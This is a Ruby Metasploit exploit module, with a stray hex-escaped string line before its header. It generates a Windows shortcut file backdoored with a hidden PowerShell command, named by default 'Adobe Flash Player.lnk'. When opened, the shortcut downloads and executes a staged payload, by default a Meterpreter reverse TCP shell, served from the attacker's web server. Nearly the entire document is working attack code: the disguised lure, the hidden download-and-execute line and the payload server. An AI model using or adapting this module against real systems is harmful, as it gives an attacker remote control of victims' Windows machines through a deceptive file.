'''\x63\x61\x72\x74\x65\x72\x73\x2d\x70\x63'''

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Microsoft Windows Powershell Backdoored LNK',
        'Description'   => %q{
          This module generates a Windows LNK file that is backdoored with
          a powershell one-liner. It then starts a small web_delivery server
          to serve the staged payload. This exploit requires the target to have
          powershell installed.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'cbrnrd' ],
        'DefaultOptions'=> { 'Payload' => 'windows/meterpreter/reverse_tcp' },
        'Targets'       =>
          [
            ['Universal Windows',
              {
                'Platform' => 'win',
                'Arch'     => [ARCH_X86, ARCH_X64]
              }
            ]
          ]
      ))
    register_options(
      [
        OptString.new("LNKFILENAME", [ true, "Shortcut's filename", "Adobe Flash Player.lnk"])
      ])
  end


  def on_request_uri(cli, _request)
      print_status('Delivering Payload')
      data = cmd_psh_payload(payload.encoded,
                             payload_instance.arch.first,
                             remove_comspec: true,
                             exec_in_place: true)

      data = %Q(#{payload.encoded} )
      send_response(cli, data,  'Content-Type' => 'application/octet-stream')
    end

  def generate_psh
    final_psh = ''
    url = get_uri
    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
    download_string = Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)
    download_and_run = "#{ignore_cert}#{download_string}"
    line = generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
    line.gsub!('powershell.exe', '')
    line.each_char do |c|
      final_psh << "#{c}\x00"
    end
    final_psh
  end

  def primer
    print_status 'Creating backdoored LNK...'
    # File format reference: https://github.com/libyal/liblnk/blob/master/documentation/Windows%20Shortcut%20File%20(LNK)%20format.asciidoc
    psh = ''
    template = File.read(File.join(Msf::Config.data_directory, 'templates', 'psh_link_template.lnk'))
    template.gsub!("\x00\x08\x00\x43\x00\x4f\x00\x44\x00\x45\x00\x48\x00\x45\x00\x52\x00\x45",   # marker in the file added to show where the command goes
                    generate_psh.each_char {|c| psh << "#{c}\x00"})
    template.gsub!("\x63\x61\x72\x74\x65\x72\x73\x2d\x70\x63", "computer")  # Replace computer name
    output = File.new(datastore['LNKFILENAME'], 'wb')
    output.write(template)
    output.close
    print_good "Done generating evil LNK. Saved as #{File.absolute_path(output.path)}"
  end
end
